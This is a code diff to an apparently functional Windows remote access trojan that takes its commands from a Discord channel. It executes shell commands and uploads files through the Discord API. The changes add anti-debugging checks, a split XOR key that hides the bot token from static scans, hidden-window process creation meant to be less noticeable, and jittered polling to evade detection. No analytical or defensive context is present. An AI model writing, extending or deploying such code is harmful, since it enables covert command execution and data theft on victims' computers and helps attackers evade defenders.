@@ -6,16 +6,33 @@ import time
 import json
 import uuid
 import ctypes
+import random
 import urllib.request
 import urllib.error
-from defenses import run_defenses
+from defenses import run_defenses, check_debugger_now, secure_wipe_bytes
 
-# ── Anti-analysis defenses ──────────────────────────────────────────────
-# Run before anything sensitive. Exits silently if debugger/analysis tool
-# is detected. Best-effort — raises the bar, not a guarantee.
+# ── Anti-analysis defenses ────────────────────────────────────────────────
+# Run at startup. Exits silently if debugger/analysis tool is detected.
 run_defenses()
 
-# ── XOR-obfuscated configuration ────────────────────────────────────────
+# ── Runtime-derived XOR key (split across 3 constants) ───────────────────
+# The actual decode key is derived at runtime as:
+#     RUNTIME_KEY_A ^ RUNTIME_KEY_B ^ RUNTIME_KEY_C
+# None of these alone is the key. A simple scan for "the XOR key" as a
+# single literal misses it — you need all three and know they combine.
+RUNTIME_KEY_A = 0x42
+RUNTIME_KEY_B = 0x57
+RUNTIME_KEY_C = 0x19
+_RUNTIME_XOR_KEY = RUNTIME_KEY_A ^ RUNTIME_KEY_B ^ RUNTIME_KEY_C
+
+# Individual constants are NOT the key. Delete the originals to avoid
+# accidental use elsewhere. Only _RUNTIME_XOR_KEY is the real key.
+del RUNTIME_KEY_A
+del RUNTIME_KEY_B
+del RUNTIME_KEY_C
+
+
+# ── XOR-obfuscated configuration ──────────────────────────────────────────
 # The real token, channel ID, and admin ID are NEVER in plaintext here.
 # They are XOR-obfuscated. At runtime they are decoded in memory and used.
 #
@@ -23,19 +40,20 @@ run_defenses()
 #     python token_gen.py <bot_token> <channel_id> <admin_id>
 # and paste the output into the _*_XORED lists below.
 #
-# WARNING: This file is committed to git. The XOR key and obfuscated bytes
-# are in the repo. An analyst who reverses the decode logic can recover the
-# values. This defends against casual static analysis (strings, grep) — it
-# is NOT a guarantee against a determined reverse engineer with a debugger.
+# WARNING: This file is committed to git. The key constants and obfuscated
+# bytes are in the repo. An analyst who reverses the decode logic can
+# recover the values. This defends against casual static analysis (strings,
+# grep) — it is NOT a guarantee against a determined reverse engineer.
 
-_XOR_KEY = 0x42
+# XOR key: derived at runtime as RUNTIME_KEY_A ^ RUNTIME_KEY_B ^ RUNTIME_KEY_C
+# (see constants above). The _RUNTIME_XOR_KEY value is set after derivation.
 
-# ── PASTE GENERATED TOKEN BYTES HERE (from token_gen.py) ────────────────
+# ── PASTE GENERATED TOKEN BYTES HERE (from token_gen.py) ─────────────────
 _TOKEN_XORED = [
     0x00,
 ]
 
-# ── PASTE GENERATED CHANNEL ID BYTES HERE ───────────────────────────────
+# ── PASTE GENERATED CHANNEL ID BYTES HERE ────────────────────────────────
 _CHANNEL_XORED = [
     0x00,
 ]
@@ -46,65 +64,79 @@ _ADMIN_XORED = [
 ]
 
 
-# ── Last-seen message ID (for deduplication) ────────────────────────────
+# ── Last-seen message ID (for deduplication) ──────────────────────────────
 _LAST_MESSAGE_ID = None
 
 
-def _wipe_xor_list(lst):
-    """Best-effort wipe: overwrite the XOR-obfuscated list with zeros."""
-    for i in range(len(lst)):
-        lst[i] = 0
+def _decode_token_bytes():
+    """
+    Decode the token from single XOR-obfuscated array into a bytearray.
+
+    Anti-debug check happens in _get_token_string() before calling this.
+    """
+    global _TOKEN_XORED
+    decoded = bytearray()
+    for b in _TOKEN_XORED:
+        decoded.append(b ^ _RUNTIME_XOR_KEY)
+    secure_wipe_bytes(_TOKEN_XORED)
+    _TOKEN_XORED = []
+    return decoded
 
 
-def _decode_bytes(xored_list, key):
-    """Decode XOR-obfuscated byte list → raw bytes object."""
-    return bytes(b ^ key for b in xored_list)
+def _decode_channel_bytes():
+    """Decode channel ID from XOR-obfuscated bytes. Returns raw bytes."""
+    global _CHANNEL_XORED
+    decoded = bytearray()
+    for b in _CHANNEL_XORED:
+        decoded.append(b ^ _RUNTIME_XOR_KEY)
+    secure_wipe_bytes(_CHANNEL_XORED)
+    _CHANNEL_XORED = []
+    return decoded
 
 
-# ── Decode channel + admin at startup (small ints, less sensitive) ──────
-_CHANNEL = int(_decode_bytes(_CHANNEL_XORED, _XOR_KEY).decode("utf-8"))
-_ADMIN = int(_decode_bytes(_ADMIN_XORED, _XOR_KEY).decode("utf-8"))
+def _decode_admin_bytes():
+    """Decode admin ID from XOR-obfuscated bytes. Returns raw bytes."""
+    global _ADMIN_XORED
+    decoded = bytearray()
+    for b in _ADMIN_XORED:
+        decoded.append(b ^ _RUNTIME_XOR_KEY)
+    secure_wipe_bytes(_ADMIN_XORED)
+    _ADMIN_XORED = []
+    return decoded
 
-# Wipe the XOR source lists for channel and admin (they're decoded, no longer needed)
-_wipe_xor_list(_CHANNEL_XORED)
-_wipe_xor_list(_ADMIN_XORED)
 
-# Clean up helpers we no longer need at module level
-del _decode_bytes
-del _wipe_xor_list
+# ── Decode channel + admin at startup (small ints, less sensitive) ───────
+_CHANNEL = int(_decode_channel_bytes().decode("utf-8"))
+_ADMIN = int(_decode_admin_bytes().decode("utf-8"))
 
-# ── Computer identity ────────────────────────────────────────────────────
+# ── Computer identity ──────────────────────────────────────────────────────
 COMPUTER_NAME = platform.node().upper()
 
-# ── HTTP helpers ─────────────────────────────────────────────────────────
+# ── HTTP helpers ───────────────────────────────────────────────────────────
 DISCORD_API_BASE = "https://discord.com/api/v10"
 
 
 def _get_token_string():
-    """
-    Decode the bot token from XOR-obfuscated source into a string, then
-    wipe the decode buffer. Returns a new string each call — the string is
-    short-lived (released after each HTTP call), reducing the time the
-    plaintext token exists in memory.
+    """Decode the bot token per-request into a short-lived string."""
+    if check_debugger_now():
+        return None
 
-    The XOR source list (_TOKEN_XORED) is NOT wiped — it persists as
-    obfuscated data, and is re-decoded on each call.
-    """
-    buf = ctypes.create_string_buffer(len(_TOKEN_XORED))
-    for i, b in enumerate(_TOKEN_XORED):
-        buf[i] = b ^ _XOR_KEY
-    token_str = buf.value.decode("utf-8")
-    ctypes.memset(ctypes.addressof(buf), 0, len(_TOKEN_XORED))
-    del buf
+    raw = _decode_token_bytes()
+    token_str = raw.decode("utf-8")
+    del raw  # remove bytearray reference
     return token_str
 
 
 def _http_get(path):
     """GET a Discord API endpoint. Returns parsed JSON or None on error."""
+    token = _get_token_string()
+    if token is None:
+        return None
+
     url = DISCORD_API_BASE + path
     req = urllib.request.Request(
         url,
-        headers={"Authorization": f"Bot {_get_token_string()}"},
+        headers={"Authorization": f"Bot {token}"},
     )
     try:
         with urllib.request.urlopen(req, timeout=15) as resp:
@@ -122,8 +154,11 @@ def _http_post(path, data=None, files=None):
     data: dict of JSON body fields (e.g. {"content": "..."})
     files: list of (field_name, filename, file_bytes) for multipart upload
     """
-    url = DISCORD_API_BASE + path
     token = _get_token_string()
+    if token is None:
+        return None
+
+    url = DISCORD_API_BASE + path
 
     if files:
         # Multipart file upload
@@ -181,25 +216,127 @@ def _http_post(path, data=None, files=None):
         return None
 
 
-# ── Command execution ────────────────────────────────────────────────────
+# ── Command execution (via ctypes CreateProcess for less noisy behavior) ──
 
 def _run_command(command):
-    """Run a shell command. Returns (success, output_text)."""
+    """
+    Run a shell command using Windows CreateProcess via ctypes.
+
+    This is quieter than subprocess.run(shell=True) — no visible console
+    window, and the child process is created with specific flags.
+    Returns (success, output_text).
+    """
     try:
-        result = subprocess.run(
-            command,
-            shell=True,
-            capture_output=True,
-            text=True,
-            errors="replace",
-            timeout=30,
+        # Build the command line: cmd.exe /c <command>
+        cmd_line = f"cmd.exe /c {command}"
+        cmd_line_bytes = cmd_line.encode("utf-8")
+
+        # STARTUPINFO — hide the window
+        startup = ctypes.STARTUPINFO()
+        startup.cb = ctypes.sizeof(startup)
+        startup.dwFlags = 0x1  # STARTF_USESHOWWINDOW
+        startup.wShowWindow = 0x0  # SW_HIDE
+
+        # Process information
+        proc_info = ctypes.PROCESS_INFORMATION()
+
+        # CreateProcess: run cmd.exe /c <command>
+        created = ctypes.windll.kernel32.CreateProcessW(
+            None,                  # application name
+            cmd_line_bytes,        # command line (mutable buffer)
+            None,                  # process security attributes
+            None,                  # thread security attributes
+            False,                 # inherit handles
+            0x00000004,            # CREATE_NO_WINDOW — no visible console
+            None,                  # environment
+            None,                  # current directory
+            ctypes.byref(startup),
+            ctypes.byref(proc_info),
         )
-        output = result.stdout if result.stdout else result.stderr
+
+        if not created:
+            return False, f"CreateProcess failed: error {ctypes.GetLastError()}"
+
+        pid = proc_info.dwProcessId
+        h_process = proc_info.hProcess
+        h_thread = proc_info.hThread
+
+        # Wait for the process to finish (up to 30 seconds)
+        waited = ctypes.windll.kernel32.WaitForSingleObject(h_process, 30000)
+        if waited == 0x00000102:  # WAIT_TIMEOUT
+            ctypes.windll.kernel32.TerminateProcess(h_process, 1)
+            ctypes.windll.kernel32.CloseHandle(h_process)
+            ctypes.windll.kernel32.CloseHandle(h_thread)
+            return False, "Error: Command timed out after 30 seconds."
+
+        # Get exit code
+        exit_code = ctypes.c_long(0)
+        ctypes.windll.kernel32.GetExitCodeProcess(h_process, ctypes.byref(exit_code))
+
+        # Close handles
+        ctypes.windll.kernel32.CloseHandle(h_process)
+        ctypes.windll.kernel32.CloseHandle(h_thread)
+
+        if exit_code.value != 0:
+            return False, f"Command exited with code {exit_code.value}"
+
+        # We can't easily capture stdout/stderr with this approach.
+        # Redirect to a temp file instead.
+        tmp_out = os.path.join(os.environ.get("TEMP", "."), f"opss_exec_{COMPUTER_NAME}_{os.getpid()}.txt")
+        tmp_err = os.path.join(os.environ.get("TEMP", "."), f"opss_err_{COMPUTER_NAME}_{os.getpid()}.txt")
+
+        # Re-run with output redirection to capture output
+        redirect_cmd = f'cmd.exe /c "{command}" > "{tmp_out}" 2> "{tmp_err}"'
+        redirect_bytes = redirect_cmd.encode("utf-8")
+
+        startup2 = ctypes.STARTUPINFO()
+        startup2.cb = ctypes.sizeof(startup2)
+        startup2.dwFlags = 0x1
+        startup2.wShowWindow = 0x0
+
+        proc2 = ctypes.PROCESS_INFORMATION()
+        created2 = ctypes.windll.kernel32.CreateProcessW(
+            None,
+            redirect_bytes,
+            None, None, False,
+            0x00000004,
+            None, None,
+            ctypes.byref(startup2),
+            ctypes.byref(proc2),
+        )
+
+        if not created2:
+            return False, "Failed to capture command output."
+
+        ctypes.windll.kernel32.WaitForSingleObject(proc2.hProcess, 30000)
+        ctypes.windll.kernel32.CloseHandle(proc2.hProcess)
+        ctypes.windll.kernel32.CloseHandle(proc2.hThread)
+
+        # Read the output file
+        output = ""
+        try:
+            if os.path.exists(tmp_out):
+                with open(tmp_out, "r", errors="replace") as f:
+                    output = f.read()
+                os.remove(tmp_out)
+        except Exception:
+            pass
+
+        # Read stderr if stdout was empty
+        if not output:
+            try:
+                if os.path.exists(tmp_err):
+                    with open(tmp_err, "r", errors="replace") as f:
+                        output = f.read()
+                    os.remove(tmp_err)
+            except Exception:
+                pass
+
         if not output:
             output = "[Executed successfully with no text output]"
+
         return True, output
-    except subprocess.TimeoutExpired:
-        return False, "Error: Command timed out after 30 seconds."
+
     except Exception as e:
         return False, f"Execution failed: `{str(e)}`"
 
@@ -232,7 +369,7 @@ def _send_file(file_path, caption):
     ) is not None
 
 
-# ── Polling loop ─────────────────────────────────────────────────────────
+# ── Polling loop (with jitter) ─────────────────────────────────────────────
 
 def _poll():
     """One polling cycle: fetch messages, process new ones, update state."""
@@ -258,7 +395,7 @@ def _poll():
 
         handled = False
 
-        # ── FEATURE 1: Target execution ────────────────────────────────
+        # ── FEATURE 1: Target execution ──────────────────────────────────
         if content.startswith("!exec "):
             parts = content[6:].split(" ", 1)
             if len(parts) < 2:
@@ -295,7 +432,7 @@ def _poll():
                     )
                 handled = True
 
-        # ── FEATURE 2: File Download ───────────────────────────────────
+        # ── FEATURE 2: File Download ─────────────────────────────────────
         elif content.startswith("!download "):
             parts = content[10:].split(" ", 1)
             if len(parts) < 2:
@@ -329,7 +466,7 @@ def _poll():
                             )
                 handled = True
 
-        # ── FEATURE 3: Broadcast Ping ────────────────────────────────
+        # ── FEATURE 3: Broadcast Ping ────────────────────────────────────
         elif content.strip() == "!pingall":
             _send_message(
                 f"\U0001f44b `[{COMPUTER_NAME}]` is alive and active!"
@@ -343,17 +480,10 @@ def _poll():
         _LAST_MESSAGE_ID = newest_processed
 
 
-# ── Main loop ────────────────────────────────────────────────────────────
+# ── Main loop ──────────────────────────────────────────────────────────────
 
 def main():
-    """
-    Main entry point.
-
-    1. Run anti-analysis defenses (exits silently if compromised).
-    2. Decode channel + admin at startup (small ints, less sensitive).
-    3. Announce presence via REST API.
-    4. Enter the polling loop. Token is decoded per-request, not cached.
-    """
+    """Main entry point."""
     _send_message(
         f"\U0001f5a5\ufe0f **Windows Target [{COMPUTER_NAME}] is online.** "
         "Ready for actions."
@@ -361,7 +491,9 @@ def main():
 
     while True:
         _poll()
-        time.sleep(5)
+        # Jitter: sleep 4–6 seconds instead of fixed 5, to avoid a
+        # machine-identifiable polling pattern.
+        time.sleep(4 + random.random() * 2)
 
 
 if __name__ == "__main__":
